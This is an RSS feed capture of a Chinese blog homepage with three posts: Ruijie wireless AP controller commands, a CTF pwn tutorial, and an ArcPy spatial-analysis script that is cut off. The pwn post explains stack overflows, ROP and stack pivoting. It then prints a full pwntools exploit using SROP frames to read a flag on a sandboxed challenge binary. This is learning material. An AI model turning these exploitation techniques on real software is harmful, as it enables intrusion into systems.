{
  "title": "主页 - 博客园",
  "link": "https://www.cnblogs.com/",
  "description": "主页 - 博客园 RSS",
  "entries": [
    {
      "title": "【网络】AC控制器上AP换新并上线命令笔记##2",
      "link": "https://www.cnblogs.com/boluo0423/p/19620604",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/boluo0423/p/19620604\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 22:35\">\n    <span>【网络】AC控制器上AP换新并上线命令笔记##2</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"网络ac控制器上ap换新并上线命令笔记2\">【网络】AC控制器上AP换新并上线命令笔记##2</h1>\n<hr />\n<p>--作者：李菠萝的多样空间</p>\n<p>--创建时间：2024-12-22</p>\n<p>--更新时间：2026-2-16，修改了重复内容，修改了一些错误，调整了格式。</p>\n<hr />\n<h1 id=\"环境\">环境：</h1>\n<p>远程设备：RG-WS7880，RG-MAP852-SF</p>\n<p>远程工具：SecureCRT</p>\n<p>系统版本：Windows 10</p>\n<hr />\n<h1 id=\"视频讲解\">视频讲解：</h1>\n<p>讲解链接：</p>\n<p><a href=\"https://www.bilibili.com/video/BV1LM411S75g/\" rel=\"noopener nofollow\" target=\"_blank\">【解决方法】AC控制器上将 AP换新并上线 ##2_哔哩哔哩_bilibili</a></p>\n<hr />\n<h1 id=\"命令列表\">命令列表：</h1>\n<p><u>注释：</u></p>\n<p><u>一下命令为锐捷设备，其他厂商同理，命令稍微变化。</u></p>\n<p><u>下列的命令的顺序和日常使用中的顺序基本一致。</u></p>\n<h2 id=\"show-ap-config-summary\">show ap-config summary</h2>\n<p>列出所有创建的 AP 的配置摘要，可用“|”管道符过滤内容</p>\n<p>show ap-config summary</p>\n<p>show ap-config summary | include 1F-2</p>\n<p>show ap-config summary | include 1082.3d07.df4c</p>\n<p>我们可以通过 ap 大致的名称或 Mac 地址查到之前的配置，网络规划中 ap 的名称是有规律的，并且装维人员在通知需要更换时都会给出房间位置，我们可以通过管道符过滤这个名称进行检索，见下图：</p>\n<p><img alt=\"\" src=\"https://picx.zhimg.com/80/v2-263ad9ec8be5d15090e0bf49de11fde3_720w.png?source=ccfced1a\" /></p>\n<p>也可以通过检索原来的 ap 的 Mac 地址，来查询 ap 的名称，从而进行 ap 的配置，见下图：</p>\n<p><img alt=\"\" src=\"https://picx.zhimg.com/80/v2-a19b8a445012ef0a6b00edd1feadba39_720w.png?source=ccfced1a\" /></p>\n<h2 id=\"no-ap-config\">no ap-config</h2>\n<p>删除原先的 ap 配置</p>\n<p>no ap-config 南苑1D_206</p>\n<p><img alt=\"\" src=\"https://picx.zhimg.com/80/v2-3d96d84fc906eb0796f65bb1fe6ba7e3_720w.png?source=ccfced1a\" /></p>\n<h2 id=\"ap-config\">ap-config</h2>\n<p>创建或者进入已经存在的 ap 配置</p>\n<p>ap-config 南苑1D_206 //通过名称进入配置</p>\n<p>ap-config 1082.3d07.df4c //推荐，通过Mac进入配置</p>\n<p>提示：推荐使用 ap 的 Mac 地址进行创建，保证唯一性。若该 ap 的 Mac 地址已经被 某个 ap 的配置摘要绑定，那么使用 ap-config Mac 会自动进入已经绑定该 Mac 的 ap 配置里面。见下图：</p>\n<p><img alt=\"\" src=\"https://pica.zhimg.com/80/v2-0d5de9af041723fb9a8174f7d089a5bf_720w.png?source=ccfced1a\" /></p>\n<h2 id=\"ap-name\">ap-name</h2>\n<p>修改 ap 配置摘要的名称</p>\n<p>ap-name 南苑1D_206</p>\n<p><img alt=\"\" src=\"https://pic1.zhimg.com/80/v2-f624ae55af8902c28725ccf0ea3b8796_720w.png?source=ccfced1a\" /></p>\n<h2 id=\"show-ap-group-summary\">show ap-group summary</h2>\n<p>查看所有已经创建的 ap 组</p>\n<p>show ap-group summary</p>\n<p><img alt=\"\" src=\"https://picx.zhimg.com/80/v2-4db7cabce75ef2b2533f253720e2ed0c_720w.png?source=ccfced1a\" /></p>\n<h2 id=\"ap-group\">ap-group</h2>\n<p>将该 ap 移动到该 ap 组中</p>\n<p>ap-group 南苑1D</p>\n<p><img alt=\"\" src=\"https://pic1.zhimg.com/80/v2-56160f63c54a79ccf968620a45d9e0c2_720w.png?source=ccfced1a\" /></p>\n<hr />\n<h1 id=\"总结\">总结：</h1>\n<p>先将旧AP的配置删除，再以AP-Mac创建一个配置。</p>\n<p>进入配置模式后，改名、改AP组等等。</p>\n<p>当state状态为Run，则成功上线。</p>\n<p>当然也可以用其他的办法，可以自行探索。</p>\n<p><img alt=\"\" src=\"https://pic1.zhimg.com/80/v2-6b2b47faa4ee8e7d27266b58d110701b_720w.png?source=ccfced1a\" /></p>\n\n\n</div>\n<div id=\"MySignature\">\n    <p>本文来自博客园，作者：<a href=\"https://www.cnblogs.com/boluo0423/\" target=\"_blank\">李菠萝的多样空间</a>，转载请注明原文链接：<a href=\"https://www.cnblogs.com/boluo0423/p/19620604\" target=\"_blank\">https://www.cnblogs.com/boluo0423/p/19620604</a></p>\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 22:35</span>&nbsp;\n<a href=\"https://www.cnblogs.com/boluo0423\">李菠萝的多样空间</a>&nbsp;\n阅读(<span id=\"post_view_count\">27</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "函数调用栈与Ret2all",
      "link": "https://www.cnblogs.com/firefly-star/p/19620531",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/firefly-star/p/19620531\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 21:19\">\n    <span>函数调用栈与Ret2all</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        The end of 2025 and stack\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"函数调用栈\">函数调用栈</h1>\n<h2 id=\"基础知识\">基础知识</h2>\n<p>寄存器： rip与eip：指令寄存器，cpu会把该寄存器地址内的数据当成指令执行（rip是64位系统的，eip是32位的）<br />\nrsp与esp：栈顶指针寄存器，表明了栈顶的位置<br />\nrbp与ebp：栈底指针寄存器，表明了栈底的位置</p>\n<p>elf文件在外存和内存中的情况如图<img alt=\"2N6XUQJ6L_T(EI3JRXE{)CM\" class=\"lazyload\" /></p>\n<p>最左边的RW与RX就是对应段的权限，R即read，读；W即write，写；x即execute，执行；可以看见外存中的文件最终执行时都会映射到内存中，内存中可以看见栈是由高地址往低地址增长的，堆是由低地址往高地址增长的。下面我们看当我们调用函数时发生了什么。比如如下程序，以64位为例</p>\n<p><img alt=\"84FX7HTTB`D(@VEPZ2NJM5\" class=\"lazyload\" /><br />\n首先看进入函数第一条指令，不是int，而是{，这个会被编译器解释成push rbp，mov rsp rbp，也就是先把rbp入栈，再把rsp抬上来，然后再sub rsp (一个立即数)  把rsp抬上去，效果如图<br />\n<img alt=\"I%EHN9HC59T4)Q@%WW})EK\" class=\"lazyload\" /></p>\n<p>然后是int，int就是声明变量，也就是把变量声明在rbp-多少，接下来继续执行就到了调用这个wow函数的时候了，调用函数时通过call指令，也就是先把当前指令的下一条指令的地址入栈（这个也就是我们常说的返回地址，我用back代替），接下来又进入wow函数的指令，这个函数第一条指令又是{，又把rbp入栈，因为rbp还是原来main函数的rbp，所以rbp1就是指向rbp的，rsp抬到rbp，如图所示<br />\n<img alt=\"S36(WXMSF~`(%EJPQ35B{7\" class=\"lazyload\" /><br />\n接下来又是sub rsp (一个立即数)，把rsp往上抬，然后是int c;声明一个变量c，效果如图<br />\n<img alt=\"6IZ$2H)A7(3{ENKG)8Z_XXX\" class=\"lazyload\" /><br />\n其实栈溢出的原理就是通过往c写值，覆盖栈上的这个返回地址，我们接下来看我们没改返回地址的时候函数返回是怎么返回的，首先有一个leave指令，这个指令就是mov rsp rbp</p>\n<p><img alt=\"E{`R{BSFVR~GAW8LFOTI0\" class=\"lazyload\" /><br />\n然后pop rbp把rsp位置的值弹出栈，赋给rbp，这时rbp已经回到main函数那里了<br />\n<img alt=\"T(6PQG7T_{V_0${C8RB@JD\" class=\"lazyload\" /></p>\n<p>此时并不会直接把上面c变量的数值销毁，而是在将来声明变量时可以再往这声明，leave之后接下来是ret，ret就是pop rip，把wow返回地址赋给指令寄存器，接下来就再跳转过去执行指令。</p>\n<p>这里就可以看出栈溢出的原理了，因为我们往栈上写值是由低地址往高地址写(图中由上往下)，所以只要我们有能写出c这个变量大小的条件，就可以把rbp及返回地址覆盖，接下来就会返回我们写成的返回地址，接下来就会去我们想让他返回的地方执行指令。</p>\n<h2 id=\"rop链原理\">rop链原理</h2>\n<p>其实rop链就是开了栈不可执行(NX保护)时，因为不能直接写汇编指令所以通过一些代码片段(gadget)去控制各寄存器，并通过ret链接起来的指令，比如有一个地址中的地址是pop rdi;ret，那我们返回地址写成这个指令的地址后，他就会执行这个指令pop rdi，然后就是ret，因为rsp没变，所以他还是在栈上取值，所以接下来就由可以填我们想让他返回到的地址了。</p>\n<h2 id=\"栈迁移原理\">栈迁移原理</h2>\n<p>栈迁移简单来说就是控制rsp，主要通过控制rbp然后进行两次leave去控制，第一次leave控制rbp，第二次leave通过控制的rbp进而控制寄存器,下面以迁移到bss段为例，第一次leave;ret:先mov rsp rbp</p>\n<p><img alt=\"C}`79BKB$1RTBYWL$X(QTI\" class=\"lazyload\" /></p>\n<p>pop rbp之后<br />\n<img alt=\"BA`BS9@63E2JK4~}5SDK8L\" class=\"lazyload\" /></p>\n<p>接下来是ret，继续执行返回地址内的指令,至此第一次leave;ret结束。因为返回地址还是leave;ret，所以有第二次leave;ret：<br />\n先mov rsp rbp<br />\n<img alt=\"O2)PBM{2$L9XG@PG71W}}`G\" class=\"lazyload\" /><br />\n接下来是pop rbp然后就是ret，在bss里取值继续执行了。从图中也可以看到，rsp与rbp都被我们控制了，函数的栈已经变化了，所以叫栈迁移。具体的攻击可以看看我之前的文章。<a href=\"https://www.cnblogs.com/firefly-star/p/19407067\" target=\"_blank\">ret2csu与栈迁移的运用</a></p>\n<h2 id=\"栈返回\">栈返回</h2>\n<p>看到这不知道各位有没有想过，既然我们自己定义的函数(这里的例子就是wow)有返回地址，那c语言库里的read，printf，write....等函数有没有返回地址呢，好像没听过？首先，他们也是有返回地址的，因为调用他们也需要call这个指令，这个指令就会把下条指令的地址入栈，只是因为调用他们的时候栈已经类似这个样子了<br />\n<img alt=\"6IZ$2H)A7(3{ENKG)8Z_XXX\" class=\"lazyload\" /></p>\n<p>所以哪怕这时候rsp的地方写了一条返回地址，我们在栈上的局部变量c里写值也是覆盖不到这个地址的，所以一般用不到这个手法。当然既然是一般就有例外，比如格式化字符串可以改printf函数的返回地址，read如果能控制写入的地址也可以改到(也得溢出一次才有可能)</p>\n<h2 id=\"栈对齐的原因及解决办法\">栈对齐的原因及解决办法</h2>\n<p>栈对齐就是为什么有时候我们返回system的时候要加个ret，实际上就是栈没对齐通过加ret对齐。栈对齐就是rsp指针要16字节对齐，因为系统调用的时候要求要对齐，也就是rsp最后一个16进制位要是0。关于这个原因就是个人观点了，我个人理解的应该比较浅，我认为就是系统本身肯定会让rsp对齐以免我们自己调用system函数的时候崩溃，但我们往返回地址后面可能写很多指令的地址，所以就导致了不对齐。解决办法: 因为64位下栈的内存单元是以8为单位的，也就是我们rsp的地址的最后一个16进制只有8和0两种可能，并且正常是rsp的末位8，这样在接下来的system函数里，因为他会push rbp,这样rsp就16字节对齐了，所以我们不对齐就说明rsp的末位是0，这样system函数push rbp之后rsp就是8字节对齐(末位是8了)，这里我们要么选择加一条指令的地址(加ret)要么就把返回地址往后写，跳过push rbp这个指令。不过也有例外，如果我们栈迁移迁到了末尾不是0也不是8的地址，加再多ret也没用，这时候就要修改迁移的位置了。</p>\n<h1 id=\"ret2all\">Ret2all</h1>\n<p>好了你已经学会函数调用栈了，快来写一道栈溢出吧。</p>\n<p><img alt=\"%TEP143FYN0V%}N{MKI\" class=\"lazyload\" /><br />\n这题保护除了canary都开了，第一个init给了我们rbp与ret（这两个在bss段上），ret可以泄露pie基地址，所以pie保护就跟没开一样了，后面用mprotect把bss段设成只读了，并且把标准错误给关了，后面开了沙盒。<br />\n<img alt=\"$S_FMVUJ5RRF65A8ZMR)A\" class=\"lazyload\" /><br />\n把execve，read，write分支都禁了并且下面write的文件描述符只能是2，read的文件描述符只能是0。后面有个栈溢出，溢出0x28字节<br />\n<img alt=\"`V{OT$DH{75328S1WROLI\" class=\"lazyload\" /></p>\n<p><img alt=\"19O3X~YGE8}3XIJ7TQ3IOD\" class=\"lazyload\" /></p>\n<p>这个是影子，首先检测前0x60是不是\"I love you I feel lonely\"字符串，后面检测rbp与ret是不是之前发给我们的，相当于只能溢出0x18了，并且还只能溢出到返回地址+8的位置。不过这里因为他调用了三次函数，所以会leave三次，就有栈迁移的机会，并且在read到0x88的地方正好是rbp最后一次指向的地方，也就是两次leave就到了我们可以控制的地方，我们把写成我们返回地址+8的地址就可以实现一次read了<br />\n<img alt=\"ZOM}~FZ59(@L(2Q)2S\" class=\"lazyload\" /></p>\n<p>但这里要注意，read之后不会直接返回，而是会进影子，所以这里我们read写入的地方有讲究，要能覆盖过我们call read的返回地址，实现栈返回，即往rsp的上方写。<br />\n<img alt=\"4X1(O6@5X$85)}4FHDX(O\" class=\"lazyload\" /><br />\n这里只要覆盖掉rsp就可以逃出影子了，因为目前泄露不出libc，所以只能用栈上现有的libc地址，我们可以找一下附近的，因为我们最多覆盖一字节，因为远程libc基址大部分是000结尾的，我们覆盖一字节是可以确保每次都能利用，如果覆盖两字节就需要爆破凭运气了。<br />\n<img alt=\"CO~10V{RTPYTD0{QIP4$}9\" class=\"lazyload\" /></p>\n<p>这里有一个syscall，但这个syscall不是特别好，因为如果我们用这个syscall调用函数后面有一个jmp，他不是ret，就比较难预测了。所以我们第一次syscall调用srop来控制rbx，之后配合magicgadget改成应该好用的gadget。改好之后就可以调用dup2(1,2)把标准输出的内容复制到标准错误，接下来就可以write泄露libc，有libc之后就先close(0)，让open打开的文件描述符是0，这样read就可以往栈内写flag了，最后再write打印出来flag就结束了。而这就需要我们在syscall下面先布置好srop的SigreturnFrame结构，这里因为长度有限不能用pwntools的函数。只能手搓了。并且要注意一下往下写需要rsp在下面，因为我们read还有影子跟着，所以rsp在下面才能实现栈返回，所以第一次往下写是逃不了影子的，简单来说就是先往下，然后leave上来，再leave下去就好了(这里上下是相对syscall来说的，这是这题最关键的部分）。大概效果是这样<br />\n<img alt=\"SMCYK`YCX%F8JAEDR$QTXAC\" class=\"lazyload\" /></p>\n<p>因为一开始的rbp是定死的，所以我们要注意在第一次的rbp上放好下面的地址就可以了，只要能调出一次srop就好办很多了，srop结构如下<br />\n<img alt=\"QCEGSM~4(_)Y0I3UKO)E38Y\" class=\"lazyload\" /><br />\n这里就是从左往右读，第一个是syscall，第二个是uc_flags第三个是&amp;uc之后依次读下去，大概离syscall0x70的位置是rdi，之后调用完一次srop要往syscall下面一个位置写一个leave，并且这个leave末尾要小于4，因为这样syscall ret之后就是leave，我们只要控制rbp就可以继续控制程序流。之后多布局一下就差不多写完了这题，多调试就好。这里因为我的本地环境跟远程不一样，所以应该是打不了远程的，不过可以参考一下，应该布局上是大差不差了，估计是有些细节不一样。exp如下</p>\n<pre><code>from pwn import *\nimport sys\ncontext.log_level='debug'\ncontext.arch='amd64'\nflag = 0\nelf=ELF('./pwn')\nlibc = ELF('./libc.so.6')\nif flag:\n    p = remote('challenge.imxbt.cn',30705)\nelse:\n    p = process('./pwn')\nsa = lambda s,n : p.sendafter(s,n)\nsla = lambda s,n : p.sendlineafter(s,n)\nsl = lambda s : p.sendline(s)\nsd = lambda s : p.send(s)\nrc = lambda n : p.recv(n)\nru = lambda s : p.recvuntil(s)\nti = lambda : p.interactive()\ndef csu():\n\tpay=p64(0)+p64(0)+p64(1)\n\treturn pay\ndef dbg():\n    gdb.attach(p)\n    pause()\nru(b'RBP:')\nrbp=int(p.recvline(),16)\nprint(hex(rbp))\nru(b'RET:')\nret=int(p.recvline(),16)\npie=ret-0x1871\nre=pie+0x3FB8\nprbp=pie+0x1253\nmain=pie+0x1874\nmagic=pie+0x1252\ntarget=pie+0x4050\nleave=pie+0x1852\nret1=pie+0x18AC\nread=pie+0x182F\nread1=pie+0x1840\nprint(hex(pie))\npay=b'I love you I feel lonely'*4+flat(rbp,ret)+flat(rbp+0x18,read)+p64(rbp-0x10)\ndbg()\nsd(pay)\npause()\npay=flat({\n0x30:p64(rbp+0xc0+0x30),#rbo:0x48\n0x38:p64(read),\n0x40:p64(leave),\n0x48:p64(rbp+0xe0-0x10+0x30),\n0x50:p64(leave),\n0x58:p64(rbp+0xd0+0x30),\n0x60:p64(rbp-0x18),\n0x68:p64(leave),\n},filler=p64(ret1))#flat(prbp,rbp+0x72+8,read)\nsd(pay+b'\\xec')\npause()\npay=b'I love you I feel lonely'*4+flat(rbp,ret)+flat(rbp+0x90+0x60,read)+p64(leave)\nsd(pay)\npay=flat({\n0x0:p64(0),#fake\n0x8:p64(0),#rdi\n0x10:p64(rbp+0x30),#rsi\n0x18:p64(rbp+0x28+0x3d),#rbp\n0x20:p64(0x6ede9),#rbx\n0x28:p64(0x200),#rdx\n0x30:p64(0),#rax\n0x38:p64(0),#rcx\n0x40:p64(rbp+0x40),#rsp\n0x48:p64(read1),\n0x50:p64(0),#eflag\n0x58:p64(0x33),#cs\n0x60:p64(rbp+0x90+1+0x60+0x60),\n0x68:p64(read),\n0x70:p64(rbp+0x20),\n0x78:p64(leave),\n0x80:0,\n})\npause()\nsd(pay)\npay=b'b'*7+p64(prbp)\npause()\nsd(pay)\npay=p64(leave)+flat(ret1)*2+p64(magic)+flat(prbp,rbp+0x59+0x60,read,rbp+0x20,leave,rbp+0x70+0x60,read,read)\npay=pay.ljust(0x60,b'\\x00')+flat({\n0x0:p64(0),#fake\n0x8:p64(1),#rdi\n0x10:p64(2),#rsi\n0x18:p64(rbp+0x100),#rbp\n0x20:p64(0x6ede9),#rbx\n0x28:p64(0x200),#rdx\n0x30:p64(33),#rax\n0x38:p64(0),#rcx\n0x40:p64(rbp+0x28),#rsp\n0x48:p64(ret1),\n0x50:p64(0),#eflag\n0x58:p64(0x33),#cs\n0x60:p64(0),\n0x68:p64(0),\n0x70:p64(rbp+0x60+0x90),\n0x78:p64(read),\n0x80:0,\n})\nsd(pay)\n\npay=b'b'*7+p64(prbp)\nsd(pay)\n\npay=flat({\n0x0:p64(0),#fake\n0x8:p64(2),#rdi\n0x10:p64(re),#rsi\n0x18:p64(rbp+0x100-0x88),#rbp\n0x20:p64(0),#rbx\n0x28:p64(0x20),#rdx\n0x30:p64(1),#rax\n0x38:p64(0),#rcx\n0x40:p64(rbp+0x28),#rsp\n0x48:p64(ret1),#rip\n0x50:p64(0),#eflag\n0x58:p64(0x33),#cs\n0x60:p64(rbp+0x90+1+0x60+0x60),\n0x68:p64(read),\n0x70:p64(rbp+0x20),\n0x78:p64(leave),\n0x80:0,\n})\n\nsd(pay)\npay=b'b'*7+p64(prbp)\n\nsd(pay)\nru(b\"Keep it and...I love you\\n\")\n\nlibcbase=u64(rc(6).ljust(8,b'\\x00'))-libc.sym['read']\nre=libcbase+libc.sym['read']\nrax=libcbase+0xdd237\nrdi=libcbase+0x10f75b\nrsi=libcbase+0x110a4d\nend=libcbase+0x98fd5\nrbx=libcbase+0x586e4\nmdx3=libcbase+0xb0133\nprint(hex(libcbase))\npay=b'./flag\\x00\\x00'*2+flat(rdi,0,rsi,rbp+0xd8,rbx,0x1000,mdx3,0,0,0,re)\n\npause()\nsd(pay)\n\nsrop=SigreturnFrame()\nsrop.rax=3\nsrop.rdi=0\nsrop.rsi=0\nsrop.rsp=rbp+0x1e8\nsrop.rip=end\nsrop1=SigreturnFrame()\nsrop1.rax=2\nsrop1.rdi=rbp+0x70\nsrop1.rsi=0\nsrop1.rsp=rbp+0x1e8+0x110\nsrop1.rip=end\nsrop2=SigreturnFrame()\nsrop2.rax=0\nsrop2.rdi=0\nsrop2.rsi=rbp\nsrop2.rdx=0x50\nsrop2.rsp=rbp+0x1e8+0x110+0x110\nsrop2.rip=end\nsrop3=SigreturnFrame()\nsrop3.rax=1\nsrop3.rdi=2\nsrop3.rsi=rbp\nsrop3.rdx=0x50\nsrop3.rip=end\npay=flat(rax,0xf,end)+bytes(srop)+flat(rax,0xf,end)+bytes(srop1)+flat(rax,0xf,end)+bytes(srop2)+flat(rax,0xf,end)+bytes(srop3)\n\nsd(pay)\nti()\n</code></pre>\n<p>这里我用了11次send，跟标答不一样的就是他是泄露libc顺便控制了rdx，之后直接用srop链了，我是没顺便控制rdx，再凑了一下gadget，所以多了一次send。效果如下<br />\n<img alt=\"RRAVM4}FI(AN(G1CJAC_NB9\" class=\"lazyload\" /></p>\n<p>ret2all参考文章<a href=\"https://blog.csdn.net/j284886202/article/details/151363747\" rel=\"noopener nofollow\" target=\"_blank\">ret2all</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-16 21:19</span>&nbsp;\n<a href=\"https://www.cnblogs.com/firefly-star\">firefly_star</a>&nbsp;\n阅读(<span id=\"post_view_count\">55</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "ArcPy 脚本：批量生成郑州市 1990-2019 年空间分析结果（核密度、热点、平均中心、标准差椭圆）",
      "link": "https://www.cnblogs.com/Laurentianelle/p/19620124",
      "published": "",
      "description": "<h1 class=\"postTitle\"><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/Laurentianelle/p/19620124\" id=\"cb_post_title_url\" title=\"发布于 2026-02-16 13:41\">\n    <span>ArcPy 脚本：批量生成郑州市 1990-2019 年空间分析结果（核密度、热点、平均中心、标准差椭圆）</span>\n    \n\n</a>\n</h1>\n\t<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"arcpy-脚本批量生成郑州市-1990-2019-年空间分析结果核密度热点平均中心标准差椭圆\">ArcPy 脚本：批量生成郑州市 1990-2019 年空间分析结果（核密度、热点、平均中心、标准差椭圆）</h1>\n<h2 id=\"背景介绍\">背景介绍</h2>\n<p>在城市研究中，我们常常需要分析多年数据的空间分布模式，比如建筑物高度在郑州市的聚集情况、热点区域变化、整体中心位置迁移以及分布方向趋势。如果每年手动在 ArcGIS 中运行四种空间分析工具，会非常耗时且容易出错。这个脚本就是为了解决这个问题而写的——它能自动批量处理 1990 到 2019 共 30 年的数据，一键生成四类分析结果，让你把精力放在结果解读上，而不是重复操作上。</p>\n<h2 id=\"代码功能说明\">代码功能说明</h2>\n<p>这个脚本的核心功能是：<strong>自动读取每一年郑州市的点要素数据（shp 文件），依次完成四种常见空间统计分析，并将结果整齐保存到对应的文件夹中</strong>。</p>\n<p>具体能实现的效果：</p>\n<ul>\n<li>核密度分析 → 生成每年建筑物高度的密度栅格图（tif）</li>\n<li>冷热点分析（Getis-Ord Gi*） → 生成每年显著的高值/低值聚集区域（shp）</li>\n<li>平均中心 → 计算每年高度加权的中心点（shp）</li>\n<li>标准差椭圆（方向分布） → 绘制每年数据的分布方向和离散程度（shp）</li>\n</ul>\n<p>适用场景：城市地理、规划、人口、经济等时空格局研究，特别是需要对比多年变化的场景。</p>\n<p>运行完成后，你会在输出文件夹里看到四个子文件夹（核密度、冷热点、平均中心、椭圆），每个文件夹里按年份命名整齐存放对应结果文件，总共约 120 个文件（30 年 × 4 类）。</p>\n<h2 id=\"运行环境准备\">运行环境准备</h2>\n<p>要运行这个脚本，你需要：</p>\n<ul>\n<li>安装 <strong>ArcGIS Pro</strong>（推荐 2.8 或更高版本）或 <strong>ArcGIS Desktop 10.x</strong>（带 Spatial Analyst 扩展）</li>\n<li>脚本使用的是 ArcGIS 自带的 Python 环境和 arcpy 模块，<strong>不需要额外用 pip 安装任何包</strong></li>\n<li>确保你的 ArcGIS 许可证已启用 <strong>Spatial Analyst</strong> 扩展（脚本会自动 checkout）</li>\n</ul>\n<p><strong>注意</strong>：普通 Python（如 Anaconda）无法运行此脚本，必须在 ArcGIS 提供的 Python 环境中执行。</p>\n<h2 id=\"详细运行步骤\">详细运行步骤</h2>\n<p>按照以下顺序操作，新手也能一步步跑通。每一步都说明了“为什么要这么做”。</p>\n<ol>\n<li>\n<p><strong>准备输入数据</strong><br />\n为什么：脚本会按年份逐个读取 shapefile 文件，如果路径或文件名不对就会报错。<br />\n操作：</p>\n<ul>\n<li>在你的磁盘上新建一个输入文件夹（例如 <code>D:\\CMAB_data\\input</code>）</li>\n<li>在里面按年份建立子文件夹：<code>1990</code>、<code>1991</code>、...、<code>2019</code></li>\n<li>将每年的点数据命名为 <code>郑州市_XXXX.shp</code>（XXXX 为年份），放入对应年份的子文件夹中<br />\n（数据结构示例：<code>输入文件夹\\1990\\郑州市_1990.shp</code>）</li>\n</ul>\n</li>\n<li>\n<p><strong>创建输出和临时文件夹</strong><br />\n为什么：脚本需要地方存放结果和临时文件，避免污染其他目录。<br />\n操作：</p>\n<ul>\n<li>新建输出文件夹，例如 <code>D:\\CMAB_data\\output\\郑州</code></li>\n<li>新建临时文件夹（scratch），例如 <code>D:\\CMAB_data\\scratch</code>（空间足够大即可）</li>\n</ul>\n</li>\n<li>\n<p><strong>保存并修改代码</strong><br />\n为什么：路径必须指向你自己的文件夹，否则找不到文件。<br />\n操作：</p>\n<ul>\n<li>将下面的完整代码复制到一个新文件中，保存为 <code>zhengzhou_spatial_analysis.py</code></li>\n<li><strong>重点修改以下三行路径</strong>（用你的实际路径替换方括号内的内容）：</li>\n</ul>\n<pre><code class=\"language-python\">input_base_dir = r\"【你的输入基础目录】\"    # 示例: r\"D:\\CMAB_data\\input\"\noutput_base_dir = r\"【你的输出基础目录】\"   # 示例: r\"D:\\CMAB_data\\output\\郑州\"\nscratch_dir = r\"【你的临时目录】\"            # 示例: r\"D:\\CMAB_data\\scratch\"\n</code></pre>\n</li>\n<li>\n<p><strong>运行脚本</strong><br />\n为什么：在 ArcGIS 自带的 Python 环境中运行才能调用 arcpy。<br />\n操作（两种方式任选其一）：</p>\n<ul>\n<li><strong>方式一（推荐）</strong>：打开 ArcGIS Pro → 顶部菜单“分析” → “Python” → 打开 Python 窗口 → 拖入你的 <code>.py</code> 文件 → 回车执行</li>\n<li><strong>方式二</strong>：在 Windows 开始菜单找到 “Python Command Prompt（ArcGIS Pro）” → 输入 <code>python C:\\path\\to\\zhengzhou_spatial_analysis.py</code><br />\n运行过程会在控制台打印进度，大约几分钟到十几分钟（取决于电脑性能和数据量）。</li>\n</ul>\n</li>\n<li>\n<p><strong>验证结果</strong><br />\n为什么：确认脚本是否成功生成了所有文件。<br />\n操作：</p>\n<ul>\n<li>运行结束后，控制台会打印统计信息（每个文件夹多少文件）</li>\n<li>打开输出文件夹，检查四个子文件夹是否都有按年份命名的文件</li>\n<li>用 ArcGIS Pro 打开任意几个结果文件查看是否正常显示</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"核心代码解析\">核心代码解析</h2>\n<p>下面是完整代码（已将个人路径模糊化）。我们用大白话逐段解释关键逻辑。</p>\n<pre><code class=\"language-python\">import arcpy\nimport os\nimport shutil\n\ndef clean_previous_results(output_base_dir, sub_folders):\n    \"\"\"删除之前的结果文件\"\"\"\n    print(\"正在清理之前的输出结果...\")\n  \n    for folder_name in sub_folders.values():\n        folder_path = os.path.join(output_base_dir, folder_name)\n        if os.path.exists(folder_path):\n            try:\n                # 删除文件夹内所有内容，但保留文件夹本身\n                for filename in os.listdir(folder_path):\n                    file_path = os.path.join(folder_path, filename)\n                    try:\n                        if os.path.isfile(file_path) or os.path.islink(file_path):\n                            os.unlink(file_path)\n                        elif os.path.isdir(file_path):\n                            shutil.rmtree(file_path)\n                    except Exception as e:\n                        print(f\" 删除 {file_path} 失败: {e}\")\n                print(f\" 已清理: {folder_name}\")\n            except Exception as e:\n                print(f\" 清理 {folder_name} 文件夹时出错: {e}\")\n        else:\n            # 如果文件夹不存在，创建它\n            os.makedirs(folder_path, exist_ok=True)\n            print(f\" 创建了: {folder_name}\")\n\ndef run_analysis():\n    # ================= 配置区域 =================\n    input_base_dir = r\"【你的输入基础目录】\"\n    output_base_dir = r\"【你的输出基础目录】\"\n    scratch_dir = r\"【你的临时目录】\"\n  \n    arcpy.CheckOutExtension(\"Spatial\")\n    arcpy.env.overwriteOutput = True\n  \n    sub_folders = {\n        \"kde\": \"核密度\",\n        \"hotspot\": \"冷热点\",\n        \"mean_center\": \"平均中心\",\n        \"ellipse\": \"椭圆\"\n    }\n  \n    # ================= 清理之前的输出结果 =================\n    clean_previous_results(output_base_dir, sub_folders)\n  \n    # ================= 开始循环处理 (1990-2019) =================\n    for year in range(1990, 2020):\n        input_shp = os.path.join(input_base_dir, str(year), f\"郑州市_{year}.shp\")\n      \n        if not os.path.exists(input_shp):\n            print(f\"文件不存在，跳过: {input_shp}\")\n            continue\n          \n        print(f\"\\n正在处理: {year} 年数据...\")\n      \n        try:\n            # --- 任务1: 核密度 ---\n            temp_point_path = os.path.join(scratch_dir, f\"temp_pts_{year}.shp\")\n            